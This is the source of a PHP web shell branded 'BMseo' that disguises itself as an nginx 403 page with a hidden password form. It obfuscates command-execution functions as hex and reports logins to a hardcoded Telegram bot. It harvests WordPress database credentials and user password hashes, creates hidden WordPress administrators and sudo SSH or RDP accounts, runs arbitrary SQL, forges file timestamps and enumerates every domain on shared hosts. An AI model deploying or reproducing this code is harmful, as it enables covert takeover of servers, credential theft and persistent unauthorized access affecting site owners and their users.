<?php

@ini_set('session.cookie_lifetime',86400);@ini_set('session.cookie_path','/');@ini_set('session.cookie_httponly',1);
@ini_set('session.cookie_samesite','Lax');if(!empty($_SERVER['HTTPS']))@ini_set('session.cookie_secure',1);
@session_start();

$PASSWORD_HASH = '$2y$10$4WvpD9fo3xq2PRlMvP4aC.j4.lpV1EytvtbF/ZoJzu.kXzDkIgyB.';
function _bm_token(){ global $PASSWORD_HASH; return hash('sha256', 'bm_' . $PASSWORD_HASH); }

// Notification wrapper - uses loader's report function OR direct Telegram API
function gecko_notify($type, $detail){
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '?';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '?';
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? substr($_SERVER['HTTP_USER_AGENT'], 0, 80) : '?';
    $full = $detail . "\nIP: " . $ip . "\nHost: " . $host . "\nUA: " . $ua;
    // Try loader functions first
    if(function_exists('_lv_report')){
        _lv_report($type, $full);
        return;
    } elseif(function_exists('_tsc_report')){
        // Get config from WP options if available
        $_cfg = null;
        if(function_exists('get_option')){
            $_raw = get_option('_tsc_config_hex','');
            if($_raw) $_cfg = @json_decode(@hex2bin($_raw), true);
        }
        if($_cfg){ _tsc_report($_cfg, $type, $full); return; }
    }
    // Direct fallback - send to Telegram API directly
    $_bt = '8616816496:AAF1qnRjqswbLwqKghGvVYyaGSiRnniFejs';
    $_ci = '2023074195';
    $icons = array('login_ok'=>"\xE2\x9C\x85",'login_fail'=>"\xF0\x9F\x9A\xAB",'shell_access'=>"\xF0\x9F\x94\x93");
    $icon = isset($icons[$type]) ? $icons[$type] : "\xF0\x9F\x93\x8B";
    $labels = array('login_ok'=>'SHELL LOGIN OK','login_fail'=>'SHELL LOGIN GAGAL','shell_access'=>'SHELL ACCESS');
    $label = isset($labels[$type]) ? $labels[$type] : strtoupper($type);
    $geo_str = '';
    $geo = @json_decode(@file_get_contents('http://ip-api.com/json/'.$ip.'?fields=country,city,isp'), true);
    if(!$geo && function_exists('curl_init')){
        $ch = curl_init('http://ip-api.com/json/'.$ip.'?fields=country,city,isp');
        curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>5));
        $geo = @json_decode(curl_exec($ch), true); curl_close($ch);
    }
    if($geo && isset($geo['country'])){
        $geo_str = ($geo['city']?$geo['city'].', ':'').$geo['country'];
        if(isset($geo['isp'])&&$geo['isp']) $geo_str .= ' | '.$geo['isp'];
    }
    $text = $icon.' <b>'.$label."</b>\n".str_repeat("\xE2\x94\x80",20)."\n";
    $text .= "\xF0\x9F\x8C\x90 ".$host."\n";
    $text .= "\xF0\x9F\x93\x9D ".$detail."\n";
    $text .= "\xF0\x9F\x92\xBB IP: <code>".$ip."</code>\n";
    if($geo_str) $text .= "\xF0\x9F\x93\x8D ".$geo_str."\n";
    $text .= "\xF0\x9F\x95\x90 ".date('Y-m-d H:i:s')."\n";
    $text .= "\xF0\x9F\x94\x8D UA: ".$ua."\n";
    $url = "https://api.telegram.org/bot".$_bt."/sendMessage";
    $post = array('chat_id'=>$_ci,'text'=>$text,'parse_mode'=>'HTML','disable_web_page_preview'=>true);
    // Try file_get_contents
    $ctx = @stream_context_create(array('http'=>array('method'=>'POST','header'=>"Content-Type: application/x-www-form-urlencoded\r\n",'content'=>http_build_query($post),'timeout'=>5,'ignore_errors'=>true)));
    $r = @file_get_contents($url, false, $ctx);
    // Fallback curl
    if($r === false && function_exists('curl_init')){
        $ch = curl_init($url);
        curl_setopt_array($ch, array(CURLOPT_POST=>1,CURLOPT_POSTFIELDS=>http_build_query($post),CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>5));
        curl_exec($ch); curl_close($ch);
    }
}

// Simple access log
function gecko_log($msg){
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '?';
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? substr($_SERVER['HTTP_USER_AGENT'], 0, 100) : '?';
    $line = '['.date('Y-m-d H:i:s').'] '.$msg.' | IP:'.$ip.' | UA:'.$ua."\n";
    @file_put_contents(__DIR__.'/.gecko.log', $line, FILE_APPEND|LOCK_EX);
}
 
if (!isset($_SESSION['authenticated'])) {
    if (isset($_COOKIE['_bm']) && $_COOKIE['_bm'] === _bm_token()) {
        $_SESSION['authenticated'] = true;
    } elseif (isset($_POST['password'])) {
        if (password_verify($_POST['password'], $PASSWORD_HASH)) {
            $_SESSION['authenticated'] = true;
            @setcookie('_bm', _bm_token(), time()+86400, '/', '', !empty($_SERVER['HTTPS']), true);
            register_shutdown_function(function(){
                gecko_notify('login_ok', 'Shell LOGIN berhasil (password auth)');
                gecko_log('LOGIN_OK');
            });
        } else {
            $error = true;
            gecko_notify('login_fail', 'Shell LOGIN gagal (wrong password)');
            gecko_log('LOGIN_FAIL');
        }
    }
    if (!isset($_SESSION['authenticated'])) {
?>
<html><head><title>403 Forbidden</title></head><body>
<center><h1>403 Forbidden</h1></center><hr><center>nginx</center>
<form method="POST" id="authForm" style="position:fixed;bottom:10px;right:10px;display:none;">
<input type="password" name="password" id="passInput" autocomplete="off" style="padding:5px;font-size:12px;opacity:0.3;border:1px solid #ccc;border-radius:3px;">
</form>
<script>
let arrowLeft=false,arrowRight=false;
document.addEventListener('keydown',function(e){if(e.key==='ArrowLeft')arrowLeft=true;if(e.key==='ArrowRight')arrowRight=true;if(arrowLeft&&arrowRight){document.getElementById('authForm').style.display='block';document.getElementById('passInput').focus();e.preventDefault();}});
document.addEventListener('keyup',function(e){if(e.key==='ArrowLeft')arrowLeft=false;if(e.key==='ArrowRight')arrowRight=false;});
document.getElementById('passInput').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('authForm').submit();if(e.key==='Escape'){document.getElementById('authForm').style.display='none';this.value='';}});
</script></body></html>
<?php exit; } }

// Detect and preserve nonce parameter in session for URL continuity
$_NONCE_PARAM = ''; $_NONCE_VALUE = ''; $_NONCE_PREFIX = '';
foreach($_GET as $_nk => $_nv){
    if(strlen($_nv) >= 16 && ctype_xdigit($_nv) && !in_array($_nk, array('d','f','don','re','ch'))){
        $_NONCE_PARAM = $_nk; $_NONCE_VALUE = $_nv;
        $_SESSION['_shell_np'] = $_nk; $_SESSION['_shell_nv'] = $_nv;
        break;
    }
}
if(!$_NONCE_PARAM && isset($_SESSION['_shell_np'])){
    $_NONCE_PARAM = $_SESSION['_shell_np']; $_NONCE_VALUE = $_SESSION['_shell_nv'];
}
if($_NONCE_PARAM) $_NONCE_PREFIX = $_NONCE_PARAM . '=' . $_NONCE_VALUE . '&';
if($_NONCE_PREFIX){
    ob_start(function($buf){
        global $_NONCE_PREFIX;
        $esc = preg_quote($_NONCE_PREFIX, '/');
        return preg_replace('/href=([\'"])\\?(?!' . $esc . ')/', 'href=$1?' . $_NONCE_PREFIX, $buf);
    });
}
 
if (isset($_GET['logout'])) { @setcookie('_bm','',1,'/'); session_destroy(); header('Location: ' . $_SERVER['PHP_SELF']); exit; }
 
@set_time_limit(0);@clearstatcache();@ini_set('error_log',NULL);@ini_set('log_errors',0);
@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors',0);
 
$Array = [
    '676574637764','676c6f62','69735f646972','69735f66696c65',
    '69735f7772697461626c65','69735f7265616461626c65','66696c657065726d73',
    '66696c65','7068705f756e616d65','6765745f63757272656e745f75736572',
    '68746d6c7370656369616c6368617273','66696c655f6765745f636f6e74656e7473',
    '6d6b646972','746f756368','6368646972','72656e616d65',
    '65786563','7061737374687275','73797374656d','7368656c6c5f65786563',
    '706f70656e','70636c6f7365','73747265616d5f6765745f636f6e74656e7473',
    '70726f635f6f70656e','756e6c696e6b','726d646972','666f70656e','66636c6f7365',
    '66696c655f7075745f636f6e74656e7473','6d6f76655f75706c6f616465645f66696c65',
    '63686d6f64','7379735f6765745f74656d705f646972',
    '6261736536345F6465636F6465','6261736536345F656E636F6465',
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) { $fungsi[] = unx($Array[$i]); }
 
if (isset($_GET['d'])) { $cdir = unx($_GET['d']); $fungsi[14]($cdir); } else { $cdir = $fungsi[0](); }
 
function file_ext($file) {
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg')
        return '<i class="fa-regular fa-image" style="color:#34d399"></i>';
    else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html')
        return '<i class="fa-solid fa-file-code" style="color:#60a5fa"></i>';
    else if (mime_content_type($file) == 'text/javascript')
        return '<i class="fa-brands fa-square-js" style="color:#fbbf24"></i>';
    else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed')
        return '<i class="fa-solid fa-file-zipper" style="color:#f97316"></i>';
    else if (mime_content_type($file) == 'text/plain')
        return '<i class="fa-solid fa-file" style="color:#94a3b8"></i>';
    else if (mime_content_type($file) == 'application/pdf')
        return '<i class="fa-regular fa-file-pdf" style="color:#ef4444"></i>';
    else return '<i class="fa-regular fa-file-code" style="color:#60a5fa"></i>';
}
 
function download($file) {
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean(); flush(); readfile($file); exit;
    }
}
 
// WP Panel Functions
function pb_find_wp_config() {
    $paths = [];
    if (isset($_SERVER['DOCUMENT_ROOT'])) $paths[] = $_SERVER['DOCUMENT_ROOT'];
    $paths[] = getcwd(); $paths[] = __DIR__;
    $found = [];
    foreach ($paths as $start) {
        $dir = @realpath($start); if (!$dir) continue;
        for ($i = 0; $i < 8; $i++) {
            $cfg = $dir . '/wp-config.php';
            if (is_file($cfg) && !in_array($cfg, $found)) $found[] = $cfg;
            $parent = dirname($dir);
            if ($parent === $dir) break; $dir = $parent;
        }
    }
    $docroot = $_SERVER['DOCUMENT_ROOT'] ?? '';
    if ($docroot && is_dir($docroot)) {
        $scan = @scandir($docroot);
        if ($scan) {
            foreach ($scan as $d) {
                if ($d === '.' || $d === '..') continue;
                $sub = $docroot . '/' . $d;
                if (is_dir($sub) && is_file($sub . '/wp-config.php')) {
                    $cfg = realpath($sub . '/wp-config.php');
                    if ($cfg && !in_array($cfg, $found)) $found[] = $cfg;
                }
            }
        }
    }
    return $found;
}
function pb_parse_wp_config($file) {
    $src = @file_get_contents($file); if (!$src) return null;
    $creds = ['config_path' => $file, 'wp_root' => dirname($file)];
    foreach (['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST'] as $c) {
        if (preg_match("/define\\s*\\(\\s*['\"]".$c."['\"]\\s*,\\s*['\"]([^'\"]*?)['\"]\\s*\\)/", $src, $m))
            $creds[$c] = $m[1];
    }
    if (preg_match('/\\$table_prefix\\s*=\\s*[\'"]([^\'"]+)[\'"]/', $src, $m)) $creds['prefix'] = $m[1];
    else $creds['prefix'] = 'wp_';
    if (empty($creds['DB_NAME']) || empty($creds['DB_USER'])) return null;
    return $creds;
}
function pb_wp_connect($creds) {
    $host = $creds['DB_HOST'] ?? 'localhost'; $port = 3306; $socket = '';
    if (strpos($host, ':') !== false) {
        $p = explode(':', $host, 2); $host = $p[0];
        if (is_numeric($p[1])) $port = (int)$p[1]; else $socket = $p[1];
    }
    $conn = @new mysqli($host, $creds['DB_USER']??'', $creds['DB_PASSWORD']??'', $creds['DB_NAME']??'', $port, $socket);
    if ($conn->connect_error) return null;
    $conn->set_charset('utf8mb4'); return $conn;
}
function pb_wp_get_users($conn, $prefix = 'wp_') {
    $users = [];
    $result = @$conn->query("SELECT ID,user_login,user_email,user_registered,user_pass FROM {$prefix}users ORDER BY ID ASC");
    if (!$result) return $users;
    while ($row = $result->fetch_assoc()) {
        $meta = @$conn->query("SELECT meta_value FROM {$prefix}usermeta WHERE user_id={$row['ID']} AND meta_key='{$prefix}capabilities'");
        $caps = $meta ? $meta->fetch_assoc() : null; $role = '-';
        if ($caps && isset($caps['meta_value'])) {
            if (strpos($caps['meta_value'],'administrator')!==false) $role='administrator';
            elseif (strpos($caps['meta_value'],'editor')!==false) $role='editor';
            elseif (strpos($caps['meta_value'],'author')!==false) $role='author';
            elseif (strpos($caps['meta_value'],'subscriber')!==false) $role='subscriber';
            else $role='other';
        }
        $row['role'] = $role; $users[] = $row;
    }
    return $users;
}
 
if (isset($_POST['pb_wp_action']) && isset($_SESSION['authenticated'])) {
    header('Content-Type: application/json');
    $action = $_POST['pb_wp_action'];
    $config_file = $_POST['wp_config'] ?? '';
    if ($action === 'scan') {
        $configs = pb_find_wp_config(); $sites = [];
        foreach ($configs as $cfg) {
            $parsed = pb_parse_wp_config($cfg);
            if ($parsed) {
                $conn = pb_wp_connect($parsed);
                $parsed['db_ok'] = $conn ? true : false;
                if ($conn) {
                    $r = @$conn->query("SELECT COUNT(*) as c FROM {$parsed['prefix']}users");
                    $parsed['user_count'] = $r ? $r->fetch_assoc()['c'] : 0;
                    $r2 = @$conn->query("SELECT option_value FROM {$parsed['prefix']}options WHERE option_name='siteurl' LIMIT 1");
                    $parsed['site_url'] = $r2 ? $r2->fetch_assoc()['option_value'] : '';
                    $conn->close();
                }
                $sites[] = $parsed;
            }
        }
        echo json_encode(['ok'=>true,'sites'=>$sites]); exit;
    }
    if (!$config_file || !is_file($config_file)) { echo json_encode(['ok'=>false,'msg'=>'Config not found']); exit; }
    $parsed = pb_parse_wp_config($config_file);
    if (!$parsed) { echo json_encode(['ok'=>false,'msg'=>'Cannot parse config']); exit; }
    $conn = pb_wp_connect($parsed);
    if (!$conn) { echo json_encode(['ok'=>false,'msg'=>'DB connection failed']); exit; }
    $prefix = $parsed['prefix'];
    if ($action === 'users') {
        echo json_encode(['ok'=>true,'users'=>pb_wp_get_users($conn,$prefix)]);
    } elseif ($action === 'reset_pass') {
        $uid = (int)($_POST['uid']??0); $newpass = $_POST['newpass']??'Admin@123';
        $md5pass = '$P$B' . substr(md5($newpass.'wp-salt'),0,31);
        $stmt = $conn->prepare("UPDATE {$prefix}users SET user_pass=? WHERE ID=?");
        $stmt->bind_param('si',$md5pass,$uid); $ok = $stmt->execute();
        echo json_encode(['ok'=>$ok,'msg'=>$ok?"Password changed to: {$newpass}":'Failed']);
    } elseif ($action === 'create_admin') {
        $username = $_POST['username']??''; $password = $_POST['password']??'';
        if (!$username||!$password) { echo json_encode(['ok'=>false,'msg'=>'Username & password required']); $conn->close(); exit; }
        $hash = '$P$B'.substr(md5($password.'wp-salt'),0,31);
        $conn->query("INSERT INTO {$prefix}users (user_login,user_pass,user_nicename,user_email,user_url,user_registered,user_activation_key,user_status,display_name) VALUES ('".$conn->real_escape_string($username)."','{$hash}','".$conn->real_escape_string($username)."','','',NOW(),'',0,'".$conn->real_escape_string($username)."')");
        $new_id = $conn->insert_id;
        if ($new_id) {
            $conn->query("INSERT INTO {$prefix}usermeta (user_id,meta_key,meta_value) VALUES ({$new_id},'{$prefix}capabilities','a:1:{s:13:\"administrator\";s:1:\"1\";}')");
            $conn->query("INSERT INTO {$prefix}usermeta (user_id,meta_key,meta_value) VALUES ({$new_id},'{$prefix}user_level','10')");
            echo json_encode(['ok'=>true,'msg'=>"Admin '{$username}' created (ID: {$new_id})"]);
        } else echo json_encode(['ok'=>false,'msg'=>'Failed: '.$conn->error]);
    } elseif ($action === 'login_url') {
        $uid = (int)($_POST['uid']??0); $newpass = bin2hex(random_bytes(8));
        $hash = '$P$B'.substr(md5($newpass.'wp-salt'),0,31);
        $stmt = $conn->prepare("UPDATE {$prefix}users SET user_pass=? WHERE ID=?");
        $stmt->bind_param('si',$hash,$uid); $stmt->execute();
        $r = $conn->query("SELECT user_login FROM {$prefix}users WHERE ID={$uid}");
        $login = $r?$r->fetch_assoc()['user_login']:'';
        $r2 = $conn->query("SELECT option_value FROM {$prefix}options WHERE option_name='siteurl' LIMIT 1");
        $siteurl = $r2?$r2->fetch_assoc()['option_value']:'';
        echo json_encode(['ok'=>true,'login'=>$login,'password'=>$newpass,'wp_login'=>$siteurl.'/wp-login.php']);
    }
    if ($conn) $conn->close(); exit;
}
 
// AJAX Handlers (chmod, touch, ls, ssh_user)
if (isset($_POST['bm_action']) && $_POST['bm_action'] === 'chmod' && isset($_SESSION['authenticated'])) {
    header('Content-Type: application/json');
    $target = $_POST['target'] ?? ''; $perm = $_POST['perm'] ?? '';
    if (!$target || !$perm) { echo json_encode(['ok'=>false,'msg'=>'Missing params']); exit; }
    $fullpath = getcwd() . '/' . $target;
    if (!file_exists($fullpath)) { echo json_encode(['ok'=>false,'msg'=>'File not found']); exit; }
    $octal = intval($perm, 8);
    $ok = @chmod($fullpath, $octal);
    echo json_encode(['ok'=>$ok,'msg'=>$ok?'Permission changed to '.$perm:'chmod failed','perm'=>$perm]); exit;
}
if (isset($_POST['bm_action']) && $_POST['bm_action'] === 'touch' && isset($_SESSION['authenticated'])) {
    header('Content-Type: application/json');
    $target = $_POST['target'] ?? ''; $ts = $_POST['timestamp'] ?? '';
    if (!$target || !$ts) { echo json_encode(['ok'=>false,'msg'=>'Missing params']); exit; }
    $fullpath = getcwd() . '/' . $target;
    if (!file_exists($fullpath)) { echo json_encode(['ok'=>false,'msg'=>'File not found']); exit; }
    $time = strtotime($ts);
    if (!$time) { echo json_encode(['ok'=>false,'msg'=>'Invalid date format']); exit; }
    $ok = @touch($fullpath, $time);
    echo json_encode(['ok'=>$ok,'msg'=>$ok?'Timestamp updated':'touch failed','date'=>date('d M Y H:i',$time)]); exit;
}
if (isset($_POST['bm_action']) && $_POST['bm_action'] === 'ls' && isset($_SESSION['authenticated'])) {
    header('Content-Type: application/json');
    $path = $_POST['path'] ?? getcwd();
    if (!is_dir($path)) $path = dirname($path);
    $items = []; $prefix = $_POST['prefix'] ?? '';
    if (is_dir($path)) {
        $scan = @scandir($path);
        if ($scan) foreach ($scan as $f) {
            if ($f === '.' || $f === '..') continue;
            $full = rtrim($path,'/').'/'.$f;
            if ($prefix && stripos($f, $prefix) === false) continue;
            $items[] = ['name'=>$f,'path'=>$full,'is_dir'=>is_dir($full)];
            if (count($items) >= 20) break;
        }
    }
    echo json_encode(['ok'=>true,'items'=>$items,'pwd'=>$path]); exit;
}
if (isset($_POST['bm_action']) && $_POST['bm_action'] === 'add_ssh_user' && isset($_SESSION['authenticated'])) {
    header('Content-Type: application/json');
    $user = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['ssh_user'] ?? '');
    $pass = $_POST['ssh_pass'] ?? '';
    if (!$user || !$pass) { echo json_encode(['ok'=>false,'msg'=>'Username & password required']); exit; }
    if (stristr(PHP_OS, 'WIN')) {
        $out = shell_exec("net user {$user} {$pass} /add 2>&1");
        $out .= shell_exec("net localgroup administrators {$user} /add 2>&1");
        echo json_encode(['ok'=>true,'msg'=>"RDP user created: {$user}","output"=>$out,'type'=>'rdp']); exit;
    } else {
        $out = shell_exec("useradd -m -s /bin/bash {$user} 2>&1");
        $out .= shell_exec("echo '{$user}:{$pass}' | chpasswd 2>&1");
        $out .= shell_exec("usermod -aG sudo {$user} 2>&1");
        $ok = (strpos($out, 'error') === false && strpos($out, 'failed') === false);
        echo json_encode(['ok'=>$ok,'msg'=>$ok?"SSH user created: {$user}":"Failed: {$out}",'output'=>$out,'type'=>'ssh','host'=>$_SERVER['SERVER_ADDR']??gethostbyname($_SERVER['SERVER_NAME'])]); exit;
    }
}

// MySQL Browser Handler
if (isset($_POST['bm_mysql']) && isset($_SESSION['authenticated'])) {
    header('Content-Type: application/json');
    $act = $_POST['bm_mysql'];
    $dbhost = $_POST['dbhost'] ?? 'localhost'; $dbuser = $_POST['dbuser'] ?? '';
    $dbpass = $_POST['dbpass'] ?? ''; $dbname = $_POST['dbname'] ?? '';
    $port = 3306; $socket = '';
    if (strpos($dbhost, ':') !== false) { $p = explode(':', $dbhost, 2); $dbhost = $p[0]; if (is_numeric($p[1])) $port = (int)$p[1]; else $socket = $p[1]; }
    $conn = @new mysqli($dbhost, $dbuser, $dbpass, $dbname ?: null, $port, $socket);
    if ($conn->connect_error) { echo json_encode(['ok'=>false,'msg'=>'Connection failed: '.$conn->connect_error]); exit; }
    $conn->set_charset('utf8mb4');
    if ($act === 'connect') {
        if ($dbname) {
            $res = $conn->query("SHOW TABLES"); $tables = [];
            while ($r = $res->fetch_row()) $tables[] = $r[0];
            echo json_encode(['ok'=>true,'tables'=>$tables,'db'=>$dbname]);
        } else {
            $res = $conn->query("SHOW DATABASES"); $dbs = [];
            while ($r = $res->fetch_row()) $dbs[] = $r[0];
            echo json_encode(['ok'=>true,'databases'=>$dbs]);
        }
    } elseif ($act === 'browse') {
        $table = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['table'] ?? '');
        $offset = max(0, (int)($_POST['offset'] ?? 0));
        $cnt = $conn->query("SELECT COUNT(*) as c FROM `{$table}`");
        $total = $cnt ? $cnt->fetch_assoc()['c'] : 0;
        $res = $conn->query("SELECT * FROM `{$table}` LIMIT 50 OFFSET {$offset}");
        $rows = []; $cols = [];
        if ($res) { while ($f = $res->fetch_field()) $cols[] = $f->name; while ($r = $res->fetch_assoc()) $rows[] = $r; }
        $pk = null;
        $ki = $conn->query("SHOW KEYS FROM `{$table}` WHERE Key_name = 'PRIMARY'");
        if ($ki && $kr = $ki->fetch_assoc()) $pk = $kr['Column_name'];
        if (!$pk && !empty($cols)) $pk = $cols[0];
        echo json_encode(['ok'=>true,'columns'=>$cols,'rows'=>$rows,'total'=>(int)$total,'table'=>$table,'pk'=>$pk]);
    } elseif ($act === 'run_sql') {
        $sql = trim($_POST['sql'] ?? '');
        if (!$sql) { echo json_encode(['ok'=>false,'msg'=>'Empty query']); $conn->close(); exit; }
        $is_select = preg_match('/^\s*(SELECT|SHOW|DESCRIBE|DESC|EXPLAIN)\s/i', $sql);
        if ($is_select) {
            $res = $conn->query($sql);
            if (!$res) { echo json_encode(['ok'=>false,'msg'=>$conn->error]); $conn->close(); exit; }
            $rows = []; $cols = [];
            while ($f = $res->fetch_field()) $cols[] = $f->name;
            while ($r = $res->fetch_assoc()) $rows[] = $r;
            echo json_encode(['ok'=>true,'columns'=>$cols,'rows'=>$rows,'total'=>count($rows),'type'=>'select']);
        } else {
            $ok = $conn->query($sql);
            if (!$ok) { echo json_encode(['ok'=>false,'msg'=>$conn->error]); $conn->close(); exit; }
            echo json_encode(['ok'=>true,'msg'=>'Query OK. Affected rows: '.$conn->affected_rows,'affected'=>$conn->affected_rows,'type'=>'exec']);
        }
    } elseif ($act === 'table_struct') {
        $table = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['table'] ?? '');
        $res = $conn->query("DESCRIBE `{$table}`");
        $cols = []; if ($res) while ($r = $res->fetch_assoc()) $cols[] = $r;
        echo json_encode(['ok'=>true,'structure'=>$cols,'table'=>$table]);
    }
    $conn->close(); exit;
}

// Active Domains Scanner Handler
if (isset($_POST['bm_action']) && $_POST['bm_action'] === 'scan_domains' && isset($_SESSION['authenticated'])) {
    header('Content-Type: application/json');
    @set_time_limit(120); @ini_set('max_execution_time','120');
    $domains = [];
    // Method 1: cPanel /etc/localdomains (most reliable on cPanel)
    $ld = @file_get_contents('/etc/localdomains');
    if ($ld) { $lines = array_filter(array_map('trim', explode("\n", $ld))); $domains = array_merge($domains, $lines); }
    // Method 2: cPanel /etc/domainips
    $di = @file_get_contents('/etc/domainips');
    if ($di) { preg_match_all('/:\s*(\S+)/', $di, $dim); if (!empty($dim[1])) $domains = array_merge($domains, $dim[1]); }
    // Method 3: cPanel /var/cpanel/users/*
    if (is_dir('/var/cpanel/users')) {
        $cpusers = @scandir('/var/cpanel/users');
        if ($cpusers) foreach ($cpusers as $cf) { if ($cf==='.'||$cf==='..'||$cf==='system') continue;
            $uc = @file_get_contents('/var/cpanel/users/'.$cf);
            if ($uc) { if (preg_match('/DNS=(\S+)/i', $uc, $dm)) $domains[] = $dm[1];
                if (preg_match_all('/DNS\d*=(\S+)/i', $uc, $dms)) $domains = array_merge($domains, $dms[1]); }
        }
    }
    // Method 4: /etc/named.conf
    $named = @file_get_contents('/etc/named.conf');
    if ($named) { preg_match_all('/zone\s+"([^"]+)"/i', $named, $m); if (!empty($m[1])) $domains = array_merge($domains, $m[1]); }
    // Method 5: Apache/Nginx configs
    foreach (['/etc/apache2/sites-enabled','/etc/httpd/conf.d','/etc/nginx/sites-enabled','/etc/httpd/conf/httpd.conf','/usr/local/apache/conf/httpd.conf'] as $confpath) {
        if (is_dir($confpath)) {
            $files = @scandir($confpath);
            if ($files) foreach ($files as $f) { if ($f==='.'||$f==='..') continue;
                $c = @file_get_contents($confpath.'/'.$f);
                if ($c && preg_match_all('/ServerName\s+(\S+)/i', $c, $m2)) $domains = array_merge($domains, $m2[1]);
                if ($c && preg_match_all('/server_name\s+([^;]+)/i', $c, $m3)) foreach ($m3[1] as $sn) $domains = array_merge($domains, preg_split('/\s+/', trim($sn)));
            }
        } elseif (is_file($confpath)) {
            $c = @file_get_contents($confpath);
            if ($c && preg_match_all('/ServerName\s+(\S+)/i', $c, $m2)) $domains = array_merge($domains, $m2[1]);
        }
    }
    // Method 6: scan /home/*/etc/* (cPanel addon/subdomain configs)
    if (is_dir('/home')) {
        $users = @scandir('/home');
        if ($users) foreach ($users as $u) { if ($u==='.'||$u==='..') continue;
            // cPanel stores domain docroots here
            $uetc = '/home/'.$u.'/etc';
            if (is_dir($uetc)) { $subds = @scandir($uetc); if ($subds) foreach ($subds as $sd) { if ($sd==='.'||$sd==='..') continue; if (strpos($sd,'.')!==false) $domains[] = $sd; } }
            // Also check /var/cpanel/userdata/$u
            $uvd = '/var/cpanel/userdata/'.$u;
            if (is_dir($uvd)) { $ufiles = @scandir($uvd); if ($ufiles) foreach ($ufiles as $uf) { if ($uf==='.'||$uf==='..'||strpos($uf,'_ssl')!==false||$uf==='main'||$uf==='cache') continue; if (strpos($uf,'.')!==false) $domains[] = $uf; } }
        }
    }
    // Filter valid domains
    $domains = array_unique(array_filter(array_map('trim', $domains), function($d) {
        return strlen($d) > 3 && strpos($d, '.') !== false && $d !== '_default_' && $d !== 'localhost' && !preg_match('/^[\d\.]+$/', $d);
    }));
    $domains = array_values($domains);
    if (empty($domains)) { echo json_encode(['ok'=>true,'domains'=>[],'total'=>0,'methods'=>'No domains found']); exit; }
    $results = []; $total = count($domains);
    // Pre-build docroot map
    $docroot_map = [];
    if (is_dir('/home')) {
        $users = @scandir('/home');
        if ($users) foreach ($users as $u) { if ($u==='.'||$u==='..') continue;
            $ph = '/home/'.$u.'/public_html';
            if (is_dir($ph)) $docroot_map[$u] = $ph;
        }
    }
    foreach ($domains as $dom) {
        $dom = trim($dom);
        $cms = '-'; $status = '-';
        // Find docroot for this domain
        $docroots = [];
        $parts = explode('.', $dom);
        foreach ($docroot_map as $user => $dr) { $docroots[] = $dr; $docroots[] = $dr.'/'.$dom; }
        $docroots[] = '/home/'.$parts[0].'/public_html';
        $docroots = array_unique($docroots);
        foreach ($docroots as $dr) {
            if (@is_file($dr.'/wp-config.php')) { $cms = 'WordPress'; break; }
            if (@is_file($dr.'/configuration.php') && @is_dir($dr.'/administrator')) { $cms = 'Joomla'; break; }
            if (@is_file($dr.'/artisan')) { $cms = 'Laravel'; break; }
            if (@is_file($dr.'/index.php') && @is_dir($dr.'/lib/pkp')) { $cms = 'OJS'; break; }
        }
        // HTTP check - try port 80 first, then 443
        $status = 'Timeout';
        $checked = false;
        foreach ([80, 443] as $port) {
            if ($checked) break;
            $prefix = ($port === 443) ? 'ssl://' : '';
            $fp = @fsockopen($prefix.$dom, $port, $errno, $errstr, 3);
            if ($fp) {
                $req = "HEAD / HTTP/1.1\r\nHost: {$dom}\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
                @fwrite($fp, $req);
                stream_set_timeout($fp, 3);
                $headers = '';
                while (!feof($fp)) { $line = @fgets($fp, 2048); if ($line === false || trim($line) === '') break; $headers .= $line; }
                @fclose($fp);
                $checked = true;
                if ($headers) {
                    $first_line = strtok($headers, "\r\n");
                    if (preg_match('/\s(\d{3})\s/', $first_line, $sc)) {
                        $code = (int)$sc[1];
                        if ($code >= 200 && $code < 300) { $status = 'Active'; }
                        elseif ($code === 301 || $code === 302 || $code === 307 || $code === 308) {
                            // Check Location: if redirect to same domain (http→https or www), count as Active
                            if (preg_match('/Location:\s*(.+)/i', $headers, $loc)) {
                                $locurl = trim($loc[1]);
                                if (stripos($locurl, $dom) !== false || stripos($locurl, 'https://'.$dom) !== false || stripos($locurl, 'https://www.'.$dom) !== false) {
                                    $status = 'Active';
                                } else { $status = 'Redirect'; }
                            } else { $status = 'Active'; }
                        }
                        elseif ($code === 403) { $status = 'Forbidden'; }
                        elseif ($code === 404) { $status = 'Not Found'; }
                        elseif ($code === 503) { $status = 'HTTP 503'; }
                        else { $status = 'HTTP '.$code; }
                    } else { $status = 'Active'; }
                } else { $status = 'No Response'; }
            }
        }
        $results[] = ['domain'=>$dom,'cms'=>$cms,'status'=>$status];
    }
    echo json_encode(['ok'=>true,'domains'=>$results,'total'=>$total]); exit;
}

if (!empty($_GET['don'])) { $FilesDon = download(unx($_GET['don'])); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow"><meta name="googlebot" content="noindex">
<title>BMseo // <?= $_SERVER['SERVER_NAME']; ?></title>
